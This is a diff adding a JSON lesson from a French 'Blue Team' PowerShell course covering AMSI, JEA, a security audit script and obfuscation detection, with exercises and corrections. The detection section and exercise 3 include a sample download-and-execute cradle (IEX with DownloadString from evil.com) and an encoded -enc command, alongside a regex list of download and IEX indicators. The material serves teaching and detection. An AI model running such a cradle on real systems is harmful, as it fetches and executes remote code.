@@ -1,0 +1,58 @@
+{
+  "id": "ps-l6-m4",
+  "title": "Blue Team — AMSI, JEA et durcissement",
+  "lang": "powershell",
+  "level": 6,
+  "order": 4,
+  "estimatedMinutes": 60,
+  "course": [
+    {
+      "section": "AMSI — Antimalware Scan Interface",
+      "content": "**AMSI** (Antimalware Scan Interface) est l'interface Windows qui permet aux antivirus de scanner le contenu des scripts PowerShell, JavaScript, VBScript avant exécution. Il s'active pour tout code évalué par `Invoke-Expression`, `[ScriptBlock]::Create()`, etc.\n\n**Pour le défenseur** : AMSI est une couche de détection native. On peut surveiller ses logs et augmenter sa visibilité.\n\n```powershell\n# Vérifier si AMSI est disponible\n$amsiType = [System.Type]::GetType('System.Management.Automation.AmsiUtils', $false)\nWrite-Host \"AMSI disponible : $($null -ne $amsiType)\"\n\n# Tester une détection AMSI (sûr — utilise le pattern de test standard)\ntry {\n    $test = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()\n    Write-Host \"PowerShell version : $($PSVersionTable.PSVersion)\"\n    Write-Host \"AMSI actif dans cette session : $($PSVersionTable.PSVersion.Major -ge 5)\"\n} catch {\n    Write-Host \"Erreur : $_\"\n}\n\n# Script Block Logging — configuration recommandée\n# Enable via GPO ou registry :\n$path = 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'\nif (Test-Path $path) {\n    $enabled = (Get-ItemProperty $path -ErrorAction SilentlyContinue).EnableScriptBlockLogging\n    Write-Host \"Script Block Logging : $(if($enabled -eq 1) {'ACTIVÉ'} else {'DÉSACTIVÉ'})\"\n} else {\n    Write-Host \"Script Block Logging : Non configuré (recommandé : activer via GPO)\"\n}\n```"
+    },
+    {
+      "section": "JEA — Just Enough Administration",
+      "content": "```powershell\n# JEA permet de limiter les droits des cmdlets disponibles\n# dans une session PowerShell déléguée\n\n# ─── Vérifier les endpoints JEA existants ───\nGet-PSSessionConfiguration | Format-Table Name, Enabled, Permission -AutoSize\n\n# ─── Créer une configuration JEA basique (démo) ───\n# 1. Fichier de capacités de rôle (.psrc)\n$psrcContenu = @'\n@{\n    VisibleCmdlets = @(\n        'Get-EventLog',\n        'Get-Process',\n        @{Name='Get-WinEvent'; Parameters=@{Name='LogName'; ValidateSet='Security','System'}}\n    )\n    VisibleFunctions = @('Get-Date')\n    VisibleProviders = @()\n}\n'@\n\n# 2. Fichier de configuration de session (.pssc)\n$psscContenu = @'\n@{\n    SchemaVersion   = '2.0.0.0'\n    GUID            = 'a11c1234-b789-cdef-0123-456789abcdef'\n    SessionType     = 'RestrictedRemoteServer'\n    RoleDefinitions = @{\n        'DOMAIN\\SOC-Analysts' = @{RoleCapabilities = 'SOCReadOnly'}\n    }\n    TranscriptDirectory = 'C:\\Transcripts\\JEA'\n}\n'@\n\nWrite-Host \"Configuration JEA exemple :\"\nWrite-Host $psscContenu\n\n# En production :\n# New-PSRoleCapabilityFile -Path 'C:\\JEA\\SOCReadOnly.psrc'\n# New-PSSessionConfigurationFile -Path 'C:\\JEA\\SOC.pssc'\n# Register-PSSessionConfiguration -Name 'SOC-JEA' -Path 'C:\\JEA\\SOC.pssc'\n```"
+    },
+    {
+      "section": "Audit et durcissement PowerShell",
+      "content": "```powershell\n# Script d'audit de la configuration de sécurité PowerShell\n\nfunction Audit-PowerShellSecurity {\n    Write-Host \"=== Audit sécurité PowerShell ===\"\n    $score = 0\n    $max = 5\n    \n    # 1. Constrained Language Mode\n    $clm = $ExecutionContext.SessionState.LanguageMode\n    $ok1 = $clm -eq 'ConstrainedLanguage'\n    Write-Host \"[$(if($ok1){'OK'}else{'NOK'})] Language Mode : $clm $(if(-not $ok1){'(recommandé: ConstrainedLanguage)'})\"\n    if ($ok1) { $score++ }\n    \n    # 2. Script Block Logging\n    $sblPath = 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'\n    $sbl = (Get-ItemProperty $sblPath -ErrorAction SilentlyContinue).EnableScriptBlockLogging -eq 1\n    Write-Host \"[$(if($sbl){'OK'}else{'NOK'})] Script Block Logging : $(if($sbl){'Activé'}else{'DÉSACTIVÉ'})\"\n    if ($sbl) { $score++ }\n    \n    # 3. Module Logging\n    $mlPath = 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging'\n    $ml = (Get-ItemProperty $mlPath -ErrorAction SilentlyContinue).EnableModuleLogging -eq 1\n    Write-Host \"[$(if($ml){'OK'}else{'NOK'})] Module Logging : $(if($ml){'Activé'}else{'DÉSACTIVÉ'})\"\n    if ($ml) { $score++ }\n    \n    # 4. PowerShell version (éviter v2 qui bypass AMSI)\n    $v2 = Get-WindowsFeature MicrosoftWindowsPowerShell -ErrorAction SilentlyContinue\n    $v2ok = $PSVersionTable.PSVersion.Major -ge 5\n    Write-Host \"[$(if($v2ok){'OK'}else{'NOK'})] Version PS : $($PSVersionTable.PSVersion)\"\n    if ($v2ok) { $score++ }\n    \n    # 5. Transcription\n    $tpath = 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription'\n    $trans = (Get-ItemProperty $tpath -ErrorAction SilentlyContinue).EnableTranscripting -eq 1\n    Write-Host \"[$(if($trans){'OK'}else{'NOK'})] Transcription : $(if($trans){'Activée'}else{'DÉSACTIVÉE'})\"\n    if ($trans) { $score++ }\n    \n    Write-Host \"`nScore sécurité PowerShell : $score/$max\"\n}\n\nAudit-PowerShellSecurity\n```"
+    },
+    {
+      "section": "Détection d'obfuscation PowerShell",
+      "content": "```powershell\n# Détecter les scripts PowerShell obfusqués dans les logs\n\nfunction Test-ObfuscationPowerShell {\n    param([string]$Code)\n    \n    $indicateurs = @()\n    $score = 0\n    \n    # Encoding base64 (-EncodedCommand)\n    if ($Code -match '-e(nc(odedcommand)?)?\\s+[A-Za-z0-9+/]{20,}' ) {\n        $indicateurs += 'Base64 EncodedCommand'\n        $score += 30\n    }\n    \n    # Backtick obfuscation\n    $backticks = ([regex]::Matches($Code, '`')).Count\n    if ($backticks -gt 5) {\n        $indicateurs += \"Backtick excessif ($backticks)\"\n        $score += $backticks * 2\n    }\n    \n    # Concatenation de strings (ex: 'i'+'e'+'x')\n    if ($Code -match \"'[a-z]'\\s*\\+\\s*'[a-z]'\") {\n        $indicateurs += 'Concaténation caractères (contournement détection)'\n        $score += 20\n    }\n    \n    # IEX / Invoke-Expression\n    if ($Code -match 'iex|invoke-expression|\\$env:comspec' ) {\n        $indicateurs += 'IEX / Invoke-Expression'\n        $score += 15\n    }\n    \n    # DownloadString\n    if ($Code -match 'downloadstring|downloadfile|webclient|bitstransfer') {\n        $indicateurs += 'Téléchargement de code'\n        $score += 25\n    }\n    \n    $niveau = if ($score -ge 50) {'CRITIQUE'} elseif ($score -ge 25) {'HAUTE'} else {'FAIBLE'}\n    \n    return [PSCustomObject]@{\n        Score       = $score\n        Niveau      = $niveau\n        Indicateurs = $indicateurs\n    }\n}\n\n$exemples = @(\n    'Write-Host \"Hello\"',\n    'powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==',\n    \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\"\n)\n\nforeach ($code in $exemples) {\n    $r = Test-ObfuscationPowerShell $code\n    Write-Host \"Score=$($r.Score) [$($r.Niveau)] : $($code.Substring(0,[Math]::Min(60,$code.Length)))\"\n    $r.Indicateurs | ForEach-Object { Write-Host \"  → $_\" }\n}\n```"
+    }
+  ],
+  "exercises": [
+    {
+      "id": "ps-l6-m4-ex1",
+      "title": "Vérifier le Language Mode PowerShell",
+      "description": "Contrôler le mode de langage de la session courante",
+      "instructions": "Vérifiez le `LanguageMode` de la session PowerShell courante et affichez :\n```\nLanguage Mode : FullLanguage\n```\n(ou ConstrainedLanguage selon la configuration du système)",
+      "validationType": "output_contains",
+      "expectedOutput": "Language Mode :",
+      "correction": "$mode = $ExecutionContext.SessionState.LanguageMode\nWrite-Host \"Language Mode : $mode\"",
+      "explanation": "FullLanguage = accès complet (développement). ConstrainedLanguage = accès restreint (sécurité renforcée, empêche l'accès aux types .NET arbitraires). En production SOC, les machines devraient tourner en ConstrainedLanguage via Device Guard/WDAC."
+    },
+    {
+      "id": "ps-l6-m4-ex2",
+      "title": "Vérifier si Script Block Logging est activé",
+      "description": "Auditer la configuration de journalisation PowerShell",
+      "instructions": "Vérifiez la valeur `EnableScriptBlockLogging` dans `HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging`. Affichez :\n```\nScript Block Logging : Activé\n```\nou `Désactivé` / `Non configuré` selon la réalité du système.",
+      "validationType": "output_contains",
+      "expectedOutput": "Script Block Logging :",
+      "correction": "$path = 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'\n$val = (Get-ItemProperty $path -ErrorAction SilentlyContinue).EnableScriptBlockLogging\n$statut = if ($val -eq 1) {'Activé'} elseif ($null -eq $val) {'Non configuré'} else {'Désactivé'}\nWrite-Host \"Script Block Logging : $statut\"",
+      "explanation": "Script Block Logging enregistre tout le code PowerShell déobfusqué dans le log `Microsoft-Windows-PowerShell/Operational`. C'est la contre-mesure principale aux attaques PowerShell obfusquées — Microsoft recommande de l'activer sur tous les systèmes."
+    },
+    {
+      "id": "ps-l6-m4-ex3",
+      "title": "Détecter IEX dans une commande",
+      "description": "Identifier les patterns d'obfuscation PowerShell basiques",
+      "instructions": "Soit la commande :\n```powershell\n$cmd = \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com')\"\n```\nSi la commande contient `IEX` ou `Invoke-Expression`, affichez :\n```\nObfuscation détectée : True\n```",
+      "validationType": "output_contains",
+      "expectedOutput": "Obfuscation détectée : True",
+      "correction": "$cmd = \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com')\"\n$suspect = $cmd -match 'iex|invoke-expression'\nWrite-Host \"Obfuscation détectée : $suspect\"",
+      "explanation": "`-match` est insensible à la casse par défaut dans PowerShell pour les comparaisons de chaînes (contrairement à `-cmatch` qui est sensible). `IEX` est l'alias d'`Invoke-Expression` — la commande qui évalue du code dynamique, souvent utilisée pour exécuter des payloads téléchargés."
+    }
+  ]
+}
